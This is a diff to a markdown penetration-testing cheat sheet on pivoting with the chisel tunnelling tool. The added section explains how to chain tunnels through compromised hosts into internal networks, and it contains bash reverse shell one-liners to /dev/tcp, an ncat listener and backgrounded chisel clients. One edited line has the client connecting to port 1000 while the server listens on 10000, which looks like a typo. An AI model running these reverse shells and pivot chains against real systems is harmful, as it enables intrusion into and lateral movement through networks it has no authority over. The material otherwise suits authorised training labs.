@@ -34,12 +34,37 @@ Chisel is useful when you can not port forward with ssh. You would then need chi
 
 ```bash
 # AttackBox
-chisel server -host 127.0.0.1 -p 8000 -reverse # -v is useful for checking connection 
+chisel server -p 10000 -reverse # -v is useful for checking connection 
 # Client
-chisel client $attackboxIP:8000 R:8001:$clientip:$port
+chisel client $attackboxIP:1000 R:8001:$targetip:$targetport
 # Accessing through the tunnel on Attackbox
 curl 127.0.0.1:8001 # will then access $clientip:$port
 ```
+
+
+## Local Pivots and Chaining with Chisel Explained
+
+Using `nohup` and `&` will background a job on a shell - very useful on linux  
+
+Presuming you have a reverse shell on both 192.168.0.1 and 192.168.0.2, where `chisel server` has opened port `10001` from `nohup ./chisel client 10.10.10.10:10000 10002:127.0.0.1:10002 &` with second reverse shell on 192.168.0.2 being: `bash -c 'bash -i >& /dev/tcp/192.168.0.1/10001 0>&1'`; consider the following as:
+```bash
+# 10.10.10.10 = kali
+# 192.168.0.1 = externally facing compromised box 
+# 192.168.0.2 = internal virtual network not exposed to internet
+# 192.168.0.3 = internal virtual network not exposed to internet
+
+rlwrap ncat -lvnp 10003
+chisel server -p 10000 -reverse -v
+# 192.168.0.1 - $kali
+nohup ./chisel client 10.10.10.10:10000 10002:127.0.0.1:10000 &
+# 192.168.0.2 - 
+nohup ./chisel client 192.168.0.1:10002 10002:127.0.0.1:10002 &
+# Reverse shell from 192.168.0.3
+bash -c 'bash -i >& /dev/tcp/192.168.0.2/10002 0>&1'
+```
+
+[For Windows consider](https://learn.microsoft.com/en-US/troubleshoot/windows-client/deployment/create-user-defined-service)
+
 
 ## 0xDF's TD;DR Cheat Sheet 
 
